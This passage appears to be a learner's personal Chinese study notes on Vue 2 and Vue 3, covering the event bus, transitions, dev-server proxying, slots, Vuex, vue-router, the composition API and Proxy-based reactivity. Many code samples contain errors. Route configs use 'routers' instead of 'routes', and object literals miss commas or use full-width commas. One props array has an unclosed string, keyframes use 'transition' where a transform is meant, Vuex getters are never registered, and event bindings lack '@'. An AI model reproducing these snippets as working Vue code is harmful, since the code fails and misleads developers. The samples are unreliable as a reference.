            	name: '张三',
        	}
        },
        methods: {
            sendStudentName(){
                this.$emit('hahaha',this.name)
            },
            unbind(){
                this.$off('hahaha')  //解绑一个
                //解绑多个用数组方式传递
                //或者不传参数就解绑所有自定义事件
            }
        }
    }

</script>
~~~

![](.\images\QQ截图20230707181643.png)

##### 全局事件总线

> <font style="color:red">实现任意组件间的通信</font>
>
> 原理：将数据存到vue.prototype

~~~javascript
//main.js文件
import Vue from	'vue'
import App from './App.vue'
vue.config.productionTip = false
//创建一个vc构造函数
const Demo = Vue.extend({})
//并且new出vc实例对象，才能在上边添加方法
const d = new Demo()
//在vue原型对象上添加该实例对象，这样别的组件就可以给d创建事件($bus.$on)了，然后需要获取数据的组件通过触发事件($bus.$emit)获取了
//组件销毁时记得解绑事件哦！$bus.$off('必填，否则全删了')
Vue.prototype.$bus = d

new Vue({
    el: '#app',
    render: h=>h(App),
    
    //创建傀儡的第二种方法
    befortCreate(){
        Vue.prototype.$bus = this
    }
})
~~~

#### 消息定义与发布

> <font style="color:red">实现任意组件间的通信</font>
>
> 使用库pubsub-js

#### $nextTick()

> vue的响应式数据修改后先变换虚拟DOM，这个过程是同步的，但是往页面添加真实DOM这个过程是异步的，所以执行一个vue实例方法时，往往不能数据更新的同时操作更新后的真实DOM
>
> 但是$nextTick()可以解决这个问题
>
> $nextTick()内传回调，会在真实DOM添加完后执行回调

#### 过渡与动画

##### 动画

~~~vue
<template>
	<div>
        <button click="isClick=!isClick"></button>
        <!-- 准备好动画和样式后拿transition包裹就可以添加动画 -->
        <!-- appear表示初始化也添加动画 -->
        <!-- 单个子标签使用transition，多个子标签使用transition-group并且子标签要添加key属性 -->
        <transition name="hello" appear>
            <div v-show="isClick" class="demo">11111</div>
    	</transition>
    </div>
</template>
<script>
	export default {
        name: 'demo',
        data(){
            return {
                isClick: 'true'
            }
        }
    }
</script>
<style>
    .demo {
        background-color: skyblue;
    }
    /* vue的规定命名,第一个单词与结构中的transition标签的name属性对应 */
    .hello-enter-active{
        animation: test 1s linear;
    }
    /* vue的规定命名,第一个单词与结构中的transition标签的name属性对应 */
    .hello-leave-active{
        animation: test 1s linear reverse;
    }
    @keyframes test {
        from {
            transition: translateX(-100%);
        }
        to {
            transition: translateX(0px);
        }
    }
</style>
~~~

##### 过渡

~~~vue
<template>
	<div>
        <button click="isClick=!isClick"></button>
        <!-- 准备好动画和样式后拿transition包裹就可以添加动画 -->
        <!-- appear表示初始化也添加动画 -->
        <transition name="hello" appear>
            <div v-show="isClick" class="demo">11111</div>
    	</transition>
    </div>
</template>
<script>
	export default {
        name: 'demo',
        data(){
            return {
                isClick: 'true'
            }
        }
    }
</script>
<style>
    .demo {
        background-color: skyblue;
        transition: 0.5s linear;
    }
    /* vue的规定命名,第一个单词与结构中的transition标签的name属性对应 */
    /* 进入的起点 */
    .hello-enter{
        transform: translateX(-100%);
    }
    /* vue的规定命名,第一个单词与结构中的transition标签的name属性对应 */
    /* 进入的终点 */
    .hello-enter-to{
        transform: translateX(0);
    }
        /* vue的规定命名,第一个单词与结构中的transition标签的name属性对应 */
    /* 离开的起点 */
    .hello-leave{
        transform: translateX(0);
    }
    /* vue的规定命名,第一个单词与结构中的transition标签的name属性对应 */
    /* 离开的终点 */
    .hello-leave-to{
        transform: translateX(-100%);
    }
</style>
~~~

![](.\images\QQ截图20230708181322.png)

##### 好用的库

> animate.css

#### vue解决跨域问题

> 跨域问题出在***自己的浏览器***（解析ajax请求是在浏览器环境，服务器能接收数据是因为使用的不是浏览器环境）上，你发出去了数据，服务器也接收了并且返回了数据，但是自己的浏览器拒绝接收
>
> cors解决跨域是在数据包中加入了特殊的响应头

> vue的解决方法：配置代理服务器
>
> 方式一：官方文档vue cli->devServer.proxy给proxy属性配置目标地址  原理：代理的服务器端口也是8080（vue cli用于解析网页时开的），只是请求会转发到配置代理服务器时写的端口，但也不是所有请求都转发，如果请求的资源是本地8080有的，就不会进行转发
>
> 方式二：官方文档vue cli->devServer.proxy给proxy属性配置成一个对象，内部除了官方文档的属性外还要加一个pathRewrite{}属性  原理：相比方式一加了请求前缀，请求中有该前缀则转发

![](.\images\QQ截图20230708190430.png)

![](.\images\QQ截图20230708190542.png)

### 插槽

#### 默认插槽

~~~vue
<!-- app.vue -->
<template>
	<!-- 以前没写过在组件标签内添加标签的情况，实际上这就是传入值给插槽 -->
	<Catagory>
    	<img src='1.jpg'/>
    </Catagory>
</template>
~~~

~~~vue
<!-- Catagory.vue -->
<template>
	<div>
        <!-- 传入的值会在slot标签出现的位置出现，如果没传值则显示slot标签的内容 -->
        <slot>我是默认插槽，没传值就显示我</slot>
    </div>
</template>
~~~

> 这样添加标签，被添加的标签都是在app.vue中解析的，即在添加标签的文件中解析

#### 具名插槽

~~~vue
<!-- app.vue -->
<template>
	<Catagory>
        <!-- 像这样传不能用两个默认插槽来接，否则会渲染成四个，因为每个默认插槽把传入的内容都接收了，可以通过具名插槽解决这个问题 -->
    	<img src='1.jpg'/>
        <img src='1.jpg'/>
    </Catagory>
</template>
~~~

~~~vue
<!-- app.vue -->
<template>
	<Catagory>
        <!-- 传的一方要添加slot属性 -->
    	<img src='1.jpg' slot="1"/>
        <img src='1.jpg' slot="2"/>
        <!-- 传多个值可以追加，不会覆盖 -->
        <img src='2.jpg' slot="3"/>
        <img src='3.jpg' slot="3"/>
    </Catagory>
</template>
~~~

~~~vue
<!-- Catagory.vue -->
<template>
	<div>
        <!-- 具名插槽要加name属性 -->
        <slot name="1"></slot>
        <slot name="2"></slot>
        <slot name="3"></slot>
    </div>
</template>
~~~

#### 作用域插槽

![](.\images\QQ截图20230709161143.png)

![](.\images\QQ截图20230709161220.png)

![](.\images\QQ截图20230709161244.png)

### vuex

#### 什么是vuex

> 专门在vue中实现集中式状态（数据）管理的一个Vue插件，对vue应用中多个组件的<font style="color:red">共享状态</font>进行集中式的管理（读/写），也是一种组件通信的方式，且适用于任意组件间通信

> 源码地址：https://github.com/vuejs/vuex

> 以前实现组件通信是用全局事件总线，但是全局事件总线有缺点：
>
> 多个组件都想用一个组件内的数据，那我们需要定义多少个事件？
>
> 而且以前对数据的使用只停留到读上，如果要对数据进行修改，那么我们还需要在存数据的组件上再写事件
>
> 于是造成这种情况：
>
> ![](.\images\QQ截图20230709163234.png)

> 而vuex就可以解决这个问题：
> ![](.\images\QQ截图20230709163541.png)

> <font style="color:red">vuex使用场景</font>：
>
> - 多个组件依赖于同一个状态（数据）
> - 来自不同的组件的行为需要变更同一状态（不同组件需要修改同一数据）

#### vuex原理

![](.\images\QQ截图20230709164839.png)

***流程解析***

> - state实际上就是数据，使用对象存储
>
> - actions存放操作的函数，也是用对象存储
>
> - 组件通过dispatch方法调用actions内的操作
>
> - 而actions内的函数想要修改state需要调用commit方法
> - mutations才是真正实现操作的对象，mutations存放着与actions内属性名一致的函数，并且存放state对象，调用commit方法后就可以进入这一步并对数据加工
> - mutations加工完后自动render

***注意***

> 这样看actions很没用，但是加上backend API就有用了，具体案例：
>
> 当你想进行某种操作，但是值不确定，actions会帮您去backend API问
>
> 一般会在这一步发ajax请求
>
> 如果传值确定，vue组件可以直接调用commit方法

#### 搭建vuex环境

~~~sh
#下载包
npm i vuex
~~~

~~~js
import store from './store/index.js'
//创建store配置项，store配置项中存放着state、actions、mutations以及dispatch方法
new Vue({
    el: '#app',
    render: h=>h(App),
    //一定要use Vuex才能配置store
    //执行后会在vue原型对象上添加$store属性
    store,
})
~~~

~~~js
// ./store/index.js
//该文件用于创建vuex中的store
import Vue from 'vue'
import Vuex from 'vuex'

//因为使用Vuex.Store前必须先use，且vue脚手架解析import会提至代码顶部，所以在这添加中间件
Vue.use(Vuex)
//准备actions，用于响应组件中的动作
const actions = {}
//准备mutations，用于操作数据（state）
const mutations = {}
//准备state，用于存储数据
const state = {}

//创建store
const store = new Vuex.Store({
    actions,
    mutations,
    state,
})
export default store
~~~

#### vuex的开发者工具

vuex集成在vue开发者工具中了，第二个选项

#### store配置项getters

> 类似计算属性

~~~js

import Vue from 'vue'
import Vuex from 'vuex'
Vue.use(Vuex)
const actions = {}
const mutations = {}
const state = {
    num: 1,
}
const getters = {
    bigSum(){
        return state.num*10
    },
}

const store = new Vuex.Store({
    actions,
    mutations,
    state,
})
export default store
~~~

#### vuex内的插件

##### mapState

> 从state取数据，使计算属性更简洁
>
> ![](.\images\QQ截图20230709182428.png)
>
> ![](.\images\QQ截图20230709182449.png)

##### mapGetters

> 类似mapState

##### mapMutations

> 封装执行commit方法的函数（调用mutations内的函数），用法类似mapState，但是调用生成的函数时记得传参

##### mapActions

> 封装执行dispatch方法的函数（调用actions内的函数），用法类似mapState

##### 总结

![](.\images\QQ截图20230709184936.png)

![](.\images\QQ截图20230709185102.png)

#### vuex模块化编码

![](.\images\QQ截图20230709194038.png)

![](.\images\QQ截图20230709194118.png)

### 路由

路由是用来实现但页面网站的

#### SPA应用

<img src=".\images\QQ截图20230710150313.png" style="zoom: 67%;" />

#### 路由分类

<img src=".\images\QQ截图20230710150724.png" style="zoom: 67%;" />

#### 路由的基本使用

~~~sh
npm i vue-router
~~~

~~~js
//main.js文件
import Vue from 'vue'
import VueRouter from 'vue-router'
import router from './router.js'
Vue.use(VueRouter)
new Vue({
    el: '#app',
    render: h=>h(App)
    router
})
~~~

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
export default new VueRouter({
    routes:[
      {
          //配置路由及路径对应的组件
          path: '/about',
          component: About
      },
      {
          path: '/home',
          component: Home
      },
    ],
})
~~~

~~~vue
<!-- App.vue -->
<template>
	<div class="container">
        <!-- 使用这个标签实现路由切换,to标签填写路径，会编译成a标签 -->
		<!-- active-class表示该元素被激活时的样式 -->
		<router-link active-class="active" to="/about">About</router-link>
		<router-link to="/home">Home</router-link>
        <div>
            <!-- 用于显示匹配路由后得到的组件的标签 -->
            <router-view></router-view>
    	</div>
    </div>
</template>
~~~

##### 注意点

<img src=".\images\QQ截图20230710160837.png" style="zoom:67%;" />

#### 嵌套路由

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
export default new VueRouter({
    routes:[
      {
          path: '/about',
          component: About,
      },
      {
          path: '/home',
          component: Home,
          children: [
            {
              path: 'news',
              component: News,
          	}
          ],
      },
    ],
})
~~~

#### 命名路由

> 作用：可以简短to中填写的路径

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
export default new VueRouter({
    routes:[
      {
          path: '/home',
          component: Home,
          children: [
            {
              name: 'news'
              path: 'news',
              component: News,
          	}
          ],
      },
    ],
})
~~~

~~~vue
<!-- Message组件 -->
<template>
	<!-- 通过path路由 -->
	<router-link active-class="active" to="/home/news">消息</router-link>
	<!-- 通过name路由 -->
	<router-link active-class="active" :to="{name: news}">消息</router-link>
    </router-link>
</template>
~~~

#### 路由传参

##### query参数

~~~vue
<!-- Message组件 -->
<template>
	<router-link active-class="active" to="/home/message/detail?id=666&title=你好啊">消息</router-link>
	<!-- 也可以这样传 -->
	<router-link active-class="active" to={
        path: '/home/message/detail',
     	query: {
            	id: '666',
                 title: '你好啊',
            }		            
   	 }>
        消息
    </router-link>
</template>
~~~

~~~vue
<!-- Detail组件 -->
<template>
	<ul>
        <li>消息编号：{{id}}</li>
        <li>消息内容：{{title}}</li>
    </ul>
</template>
<script>
	export default {
        name: 'Detail',
        data(){
            return {
                //通过this.$route.query接收参数
                ...this.$route.query
            }
        }
    }
</script>
~~~

##### params参数

~~~vue
<!-- Message组件 -->
<template>
	<!-- 传递params参数的方法 -->
	<router-link active-class="active" to="/home/news/666/hello">消息</router-link>
	<!-- 也可以这样传 -->
	<router-link active-class="active" to={
        <!-- 这里只能写name，不能写path -->
        name: 'news',
     	params: {
            	id: '666',
                 title: '你好啊',
            }		            
   	 }>
        消息
    </router-link>
</template>
~~~

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
import Detail from '../components/Detail'
export default new VueRouter({
	routers: [
              {
                  path: '/home',
                  component: Home,
                  children: [
                    {
                      path: 'news',
                      component: News,
                      children: [
                            {
                                //路由要这样写才能拿到
                                name: 'news'
                                path: '/home/news/:id/:title',
                                component: Detail
                            },
                        ],
                    }
                  ],
              }
    ]
})
~~~

~~~vue
<script>
	export default {
        name: 'Detail',
        data(){
            return {
                ...$route.params
            }
        }
    }
</script>
~~~

##### 路由的props配置

> 第一种写法，写成对象，只能传死数据

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
import Detail from '../components/Detail'
export default new VueRouter({
     routers: [
              {
                  path: '/home',
                  component: Home,
                  children: [
                    {
                      path: 'news',
                      component: News,
                      children: [
                            {
                                path: '/home/news/detail',
                                component: Detail，
                                //只能传死数据
                                props: {
                                	a:'1',
                                	b: 'hello'
                            	}
                            },
                        ],
                    }
                  ],
              },
    ]
})
~~~

~~~vue
<script>
	export default {
        name: 'Detail',
        props: ['a','b],
    }
</script>
~~~

> 第二种写法，写成布尔型，可以将params转成props被收到

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
import Detail from '../components/Detail'
export default new VueRouter({
	routers: [
              {
                  path: '/home',
                  component: Home,
                  children: [
                    {
                      path: 'news',
                      component: News,
                      children: [
                            {
                                name: 'news'
                                path: '/home/news/:id/:title',
                                component: Detail,
                                //这样写就可以被props收到
                                props: true
                            },
                        ],
                    }
                  ],
              }
    ]
})
~~~

> 第三种写法，写成函数，可以接收query和params

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
import Detail from '../components/Detail'
export default new VueRouter({
	routers: [
              {
                  path: '/home',
                  component: Home,
                  children: [
                    {
                      path: 'news',
                      component: News,
                      children: [
                            {
                                name: 'news'
                                path: '/home/news/:id/:title',
                                component: Detail,
                                //回调，被传入$route
                                props($route){
                          			return {
                          				...$route.query
                          			}
                          		}
                            },
                        ],
                    }
                  ],
              }
    ]
})
~~~

#### route-link的replace属性

![](.\images\QQ截图20230710173240.png)

#### 编程式路由导航（$router）

> 当不能写router-link添加路由时
>
> 比如：因为router-link只能转成a标签，如果遇到button标签的路由使用router-link会破坏结构
>
> 这时候就使用编程式路由导航

~~~vue
<!-- Message组件 -->
<template>
</template>
<script>
	export default {
        name: 'Message',
        methods: {
          pushShow(){
              //push路由，保留所有历史记录
              this.$router.push({
                  path: '/about',
                  query:{
                      id: '666',
                      title: 'hello',
                  }
              })
          },
            replaceShow(){
              //replace路由，替换掉当前页面，不保留当前页面的历史记录
              this.$router.replace({
                  path: '/about',
                  query:{
                      id: '666',
                      title: 'hello',
                  }
              })
          }  
        },
    }
</script>
~~~

#### 缓存路由组件

> 当我们在组件页面中有文本框的地方填入一些东西，切走后再回来文本框就被清空了
>
> 原因是组件被切走后就被销毁了
>
> 那要怎样缓存这些东西呢？（怎样让组件被切走也不会被销毁）

> 在需要缓存的组件引入位置（router-view标签）放在\<keep alive></keep alive>标签中
>
> 并且\<keep alive>标签要添加include属性，include属性添加想不被销毁的组件名，否则所有组件都不会被销毁，影响效率

#### 路由组件独有的生命周期钩子

> activated -- 激活时调用
>
> deactivated -- 失活时调用

> 原来设置定时器后，要销毁定时器都是在beforeDestroy，但是加了缓存路由组件后，就销毁不掉了，使用deactivated 就可以销毁了

#### 路由守卫

> 给路由加上限制，比如访问某个路由需要某些条件，那这些条件应该加在哪呢？

##### 全局路由守卫

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
import Detail from '../components/Detail'
const router = new VueRouter({
})
//全局前置路由守卫，路由前先走beforeEach
router.beforeEach((to,from,next)=>{
    //from表示从哪去
    //to表示去哪
    //next表示放行，执行next才能路由
    //这里面就可以写限制逻辑了
})
//可以在配置路由时在meta属性内做标识，区分哪些需要路由
router.beforeEach((to,from,next)=>{
    //这样获取meta属性内容
    if(to.meta.isAuth){}
})

//全局后置路由守卫，路由完再走afterEach
router.afterEach((to,from)=>{
    //可以用于修改页签名
    //如果使用前置路由修改，被限制的路由进不去，但是却会改变页签名
	//使用后置路由的话更合逻辑
})
export default router
~~~

##### 独享路由守卫

> 只有前置没有后置

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
import Detail from '../components/Detail'
const router = new VueRouter({
    routers: [
              {
                  path: '/home',
                  component: Home,
                  //配置独享路由守卫
                  beforeEnter: (to,from,next)=>{
                      
                  }
              }
    ]
})
~~~

##### 组件内路由守卫

~~~vue
<script>
	export default {
        name: 'Demo',
        //通过路由规则，进入该组件时被调用，不是通过路由规则进入（比如标签引入），就不生效
        beforeRouteEnter(to,from,next){},
        //通过路由规则，离开该组件时被调用(与后置不同，后置是路由完调用，这个是切换组件时调用)
        beforeRouteLeave(to,from,next){},
    }
</script>
~~~

#### router模式

##### hash模式

> 使用路由的时候，浏览器的url中存在/#/的字样，这表示/#/后的字段将不会被发送到服务器，被称为hash模式
>
> vue-router使用这个方法实现页面内跳转
>
> vue-router默认为这个模式

##### history模式

> 不带/#/，但能起到hash模式的效果，但是兼容性略差

~~~js
//router.js
import VueRouter from 'vue-router'
import About from '../components/About'
import Home from '../components/Home'
import News from '../components/News'
import Detail from '../components/Detail'
const router = new VueRouter({
    //转变成history模式
    mode: 'history'
    routers: [
              {
                  path: '/home',
                  component: Home,
                  //配置独享路由守卫
                  beforeEnter: (to,from,next)=>{
                      
                  }
              }
    ]
})
~~~

##### 总结

<img src=".\images\QQ截图20230710195006.png" style="zoom:67%;" />

## 常用组件库

<img src=".\images\QQ截图20230711131423.png" style="zoom:67%;" />

# Vue3

## 使用vite创建vue3工程

### 什么是vite

> 新一代的前端构建工具
>
> 优势如下:
>
> - 开发环境中，无需打包操作，可快速的冷启动
> - 轻量快速的热重载（hmr）
> - 真正的按需编程，不再等待整个应用编译完成

vite与webpack工作模式对比：
![](.\images\QQ截图20230711143554.png)

[搭建教程](https://cn.vitejs.dev/guide/)

#### main.js文件

~~~js
//引入createApp的工厂函数
import { createApp } from 'vue'
import App from './App.vue'
createApp(App).mount('#app')
//createApp(App)返回的对象类似于vm，但是比vm轻，没有那么多属性和方法
~~~

## 以下内容是以webpack为基础

## compusition API（组合式API）

> 组合式API就是将生命周期钩子、响应式函数封装成独立的模块，要用时通过import引入
>
> 这些函数可以在外部进行组合（hooks），再通过import一键引入，所以称为组合式API

### 拉开序幕的setup

> setup是vue3中新提出的配置项，写在vc的配置项中
>
> 是所有组合API表演的舞台，组件中用到的：数据、方法等等，均要配置在setup中
>
> setup有两种返回值：
>
> - 如果返回对象，则对象中的属性、方法，在模板中均可直接使用（重点）
> - 若返回一个渲染函数，则可以自定义渲染内容

~~~vue
<template></template>
<script>
	export default {
        name: 'Demo',
        //以下代码没有响应式
        setup(){
            //数据
            let name = '张三'，
            let age = 18
            //方法
            function hello(){
                alert(`你好啊${name}`)
            }
            //return后，模板中可以直接使用
            return {
                name,
                age,
                hello,
            }
        },
    }
</script>
~~~

#### setup注意点

<img src=".\images\QQ截图20230711171837.png" style="zoom:67%;" />

### ref函数

> 解决前面提到的setup没有响应式的问题，ref主要用于处理基本数据类型的数据，对于复杂数据类型会在内部调用其他函数处理

~~~vue
<template>
	<!-- name属性不需要.value，模板解析会自动解析ref对象然后.value -->
	<span>{{name}}</span>
	<span>{{job.type}}</span>
	<span>{{job.salary}}</span>
</template>
<script>
    //用到啥都要引入
    import {ref} from 'vue'
	export default {
        name: 'Demo',
        setup(){
            //通过ref()函数创建数据，可以实现响应式
            //ref()会返回一个对象，被称为RefImpl（引用实现）对象
            //内部有value属性，该属性有数据代理
            let name = ref('张三')
            let age = ref('18')
            //对于对象数据类型，ref()会返回Proxy实例对象
            const job = ref({
                type: '前端',
                salary: 5000，
            })
            function hello(){
                alert(`你好啊${name}`)
                //setup内部使用name需要加.value
                name.value = '李四'
                //对象数据类型的value属性是Proxy实例，不是RefImpl实例，所以type不需要.value
                job.value.type = '后端'
            }
            return {
                name,
                age,
                hello,
            }
        },
    }
</script>
~~~

### reactive函数

> 定义一个***复杂数据类型***的响应式数据，前面ref中传递对象后，ref会自动跳转到reactive处理，而reactive内又使用Proxy创建真正的对象/数组
>
> reactive是深拷贝工作模式

~~~vue
<template>
	<!-- name属性不需要.value，模板解析会自动解析ref对象然后.value -->
	<span>{{name}}</span>
	<span>{{job.type}}</span>
	<span>{{job.salary}}</span>
</template>
<script>
    //用到啥都要引入
    import {ref,reactive} from 'vue'
	export default {
        name: 'Demo',
        setup(){
            const job = reactive({
                type: '前端',
                salary: 5000，
            })
            function hello(){
                //这里取数据就不需要.value了，因为之前ref产生的.value就是通过reactive返回的对象
                job.type = '后端'
            }
            return {
                hello,
            }
        },
    }
</script>
~~~

### ref和reactive的区别

<img src=".\images\QQ截图20230711170937.png" style="zoom:67%;" />

### computed计算属性函数

~~~vue
<template>
</template>
<script>
    //用到啥都要引入
    import {computed,reactive} from 'vue'
	export default {
        name: 'Demo',
        setup(){
            const person = reactive({
                firstName: '张',
                lastName: '三',
                age: 18
            })
            person.fullName = computed(() => person.firstName+"-"+person.lastName)
            //或者
            person.fullName = computed({
                get(){},
                set(){}
            })
            return {
                person
            }
        },
    }
</script>
~~~

### watch监视属性函数

~~~vue
<template>
	<div>
        {{sum}}
    </div>
	<div>
        {{msg}}
    </div>
	<div>
    	<span>{{person.name}}</span>
        <span>{{person.age}}</span>
    </div>
	<button @click="add1">
        点我sum+1
    </button>
	<button @click="msg+='!'">
        点我msg多一个!
    </button>
	<button @click="editName">
        修改姓名
    </button>
	<button @click="person.age++">
       	增长年龄
    </button>
</template>
<script>
    //用到啥都要引入
    import {ref,watch,reactive} from 'vue'
	export default {
        name: 'Demo',
        setup(){
            let sum = ref(1)
            let msg = ref('你好啊')
            const person = reactive({
                name: '张三',
                age: 18,
                job: {
                    firstJob: '前端',
                    lastJob: '全栈'
                }
            })
            function add1(){
                sum.value++
            }
            function editName(value){
                person.name = value
            }
            //监视ref定义的数据
            //情况一：监视一个数据
            watch(sum,(newValue,oldValue)=>{
                console.log('sum的值变化了')
            })
            //情况二：监视多个数据
            watch([sum,msg],(newValue,oldValue)=>{
                //此时newValue和oldValue被丢在一个数组里
            })
            //情况三：添加监视配置项
            watch(sum,(newValue,oldValue)=>{},{
                immediate: true,
            })
            
            //监视reactive定义的数据
            //情况四：watch管理reactive的数据时，无法正确的获得oldValue（oldValue和newValue相同）
            //并且默认开启deep,且不能关
            watch(person,(newValue,oldValue)=>{
                
            })
            //情况五：监视reactive定义的数据的某个属性
            watch(()=>person.age,(newValue,oldValue)=>{
                
            })
            //情况六：监视reactive定义的数据的某些属性
            watch([()=>person.age,()=>person.name],(newValue,oldValue)=>{
                
            })
            //情况七：监视通过get()返回的对象，需要手动开启deep
            watch(()=>person.job,(newValue,oldValue)=>{
                
            },{deep:true})
            return {
                sum,
                msg,
                person,
                add1,
            }
        },
    }
</script>
~~~

#### watchEffect函数

~~~vue
<template>
</template>
<script>
    //用到啥都要引入
    import {ref,watchEffect,reactive} from 'vue'
	export default {
        name: 'Demo',
        setup(){
             const person = reactive({
                name: '张三',
                age: 18,
                job: {
                    firstJob: '前端',
                    lastJob: '全栈'
                }
            })
            //监视回调内被用到的属性
            //并且能分辨多层对象
            watchEffect(()=>{
                const x = person.name
                const y = person.job.firstJob 
            })
            return {
                person
            }
        },
    }
</script>
~~~

### 自定义Hook函数（非常重要）

> 本质是一个函数，把setup中使用的composition API进行了封装
>
> 类似于mixin
>
> 优势：复用代码，是setup中的逻辑更清晰

> - 项目中有一个hooks文件夹，将需要复用的js代码放在里面
> - 需要复用的代码需要有返回值->通常是响应式数据
> - 通过import引入

### toRef

<img src=".\images\QQ截图20230712142330.png" style="zoom:67%;" />

> 主要应用场景：以前对于对象数据，放到模板中需要把对象实例名也写出来，如果用到的属性很多，实例名也要重复很多次。比如person.name，person.age，person.job...，toRef就可以解决这个问题

### 其他composition API

#### shallowReactive和shallowRef

>- shallowReactive只处理对象类型第一层的响应式
>- shallowRef如果传入对象，不求助reactive，所以不是响应式

#### readonly和shallowReadonly

> <img src=".\images\QQ截图20230712150833.png" style="zoom:67%;margin-left:0" />

#### toRaw和markRaw(重要)

> <img src=".\images\QQ截图20230712152333.png" style="zoom:67%;margin-left: 0" />

#### customRef(重要)

> - 作用：创建一个自定义的ref，并对其依赖项跟踪和更新触发进行显示控制
>
> <img src=".\images\QQ截图20230712154939.png" style="zoom:67%;margin-left:0" />

#### provide和inject(重要)

> <img src=".\images\QQ截图20230712155247.png" style="zoom:67%;margin-left:0" />
>
> <img src=".\images\QQ截图20230712160046.png" style="zoom:67%;margin-left:0" />

#### 响应式数据的判断(重要)

> <img src=".\images\QQ截图20230712160829.png" style="zoom:67%;margin-left:0" />

### composition API(组合式API)的优势

> <img src=".\images\QQ截图20230712161003.png" style="zoom:67%;margin-left:0" />
>
> <img src=".\images\QQ截图20230712161444.png" style="zoom: 67%;margin-left:0" />

<font style="color:red">也就是说要让组合式API发挥作用，就必须使用hooks</font>

## Vue3的响应式原理

> vue2的数据代理有一些毛病，对象添加或删除属性不会触发响应式，数组不按规定方法去操作也不会触发响应式，但是vue2也给了一些解决方法，但用起来还是很麻烦
>
> vue3就解决这些问题，功劳都是Proxy

> 那么Proxy是怎么工作的呢？

~~~js
let person = {
    name: '张三',
    age: 18
}
//模拟Vue2中数据代理的方式
let p = {}
Object.defineProperty(p,'name',{
    get(){
        return person.name
    },
    set(value){
        person.name = value
    },
})
//这样定义后，p增加和删除属性都不会被person捕获到

//模拟Vue3中数据代理的方式
//使用window上内置的Proxy方法
const p = new Proxy(person,{})
//这样定义完后就可以实现代理效果了，并且增加和删除属性都会被person捕获到

//但是要实现响应式，还需要这样配置
const p = new Proxy(person,{
    get(oriObj,key){
        return oriObj[key]
    },
    
    //响应式的实现
    //修改属性值和增加属性时调用
    set(oriObj,key,value){
        oriObj[key] = value
        console.log('更新界面')
    },
    //删除属性
    deleteProperty(oriObj,key){
        return delete oriObj[key]
        console.log('更新界面')
    }
})

//上面就能简单实现响应式，但是vue3并没有直接使用oriObj和key，而是使用了window内置方法Reflect
//使用Reflect对开发比较友好
const p = new Proxy(person,{
    get(oriObj,key){
        return Reflect.get(oriObj,key)
    },
    
    //响应式的实现
    //修改属性值和增加属性时调用
    set(oriObj,key,value){
        Reflect.set(oriObj,key,value)
        console.log('更新界面')
    },
    //删除属性
    deleteProperty(oriObj,key){
        return Reflect.deleteProperty(oriObj,key)
        console.log('更新界面')
    }
})
~~~

## vue3生命周期

> 相比vue2没本质上的改变
>
> 只是beforeCreate要在明确el之后
>
> beforeDestroy和Destroy改成beforeUnmount和Unmounted

> 在Vue3中，生命周期钩子可以通过组合API的形式放到setup()中，但是需要改名

<img src=".\images\QQ截图20230712134230.png" style="zoom:67%;" />

## 新的组件

### Fragment组件

<img src=".\images\QQ截图20230712162110.png" style="zoom:67%;margin-left:0" />

### Teleport

<img src=".\images\QQ截图20230712162327.png" style="zoom:67%;margin-left:0" />

### Suspense

<img src=".\images\QQ截图20230712165812.png" style="zoom:67%;margin-left:0" />

## Vue3中其他变化

### 全局API的转移

<img src=".\images\QQ截图20230712170023.png" style="zoom:67%;margin-left:0" />

<img src=".\images\QQ截图20230712170054.png" style="zoom: 67%;margin-left:0 " />

### 其他改变

<img src=".\images\QQ截图20230712170517.png" style="zoom:67%;margin-left:0" />

<img src=".\images\QQ截图20230712170830.png" style="zoom:67%;" />
